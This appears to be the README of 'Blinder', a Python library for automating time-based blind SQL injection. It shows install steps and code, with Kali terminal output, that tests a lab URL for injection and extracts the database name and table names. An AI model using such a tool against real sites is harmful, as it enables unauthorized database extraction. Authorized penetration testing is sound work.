# Blinder

Blidner is a small python library to automate time-based blind SQL injection by using a pre defined queries as a functions to automate a rapid PoC development.

# Installation

You can install Blinder using the following command:

`pip install blinder`

Or by downloading the source and importing it manually to your project.

# Usage

To use blinder you need to import `Blinder` module then start using the main functions of Blinder.

You can use Blinder "with the current version" to do the following:

* Check for time based injection.
* Get database name.
* Get tables names.

**You can check for injection in a URL using the following code:**

```
#!/usr/bin/python

import Blinder

blind = Blinder.blinder(
    "http://sqli-lab/sql_injection/index.php?search=3",
    sleep=1
 )

print blind.check_injection()

```

The execution result will be:

```
root@kali:~/Desktop# python check.py 
True
root@kali:~/Desktop# 
```
**You can Get database name using the following code:**

```
#!/usr/bin/python

import Blinder

blind = Blinder.blinder(
    "http://sqli-lab/sql_injection/index.php?search=3",
    sleep=1
 )

print "Database name is : %s " % blind.get_database()

```

And the results will be:

```
root@kali:~/Desktop# python get-database.py 
Database name is : db1 
root@kali:~/Desktop# 
```

**To get tables names you can use the following code:**

```
#!/usr/bin/python

import Blinder

blind = Blinder.blinder(
    "http://192.168.1.18/sql_injection/index.php?search=3",
    sleep=1
 )

tables = blind.get_tables()

for table in tables:
    print table

```
And the results will be:

```
root@kali:~/Desktop# python get-tables.py 
blogs
notes
root@kali:~/Desktop# 
```
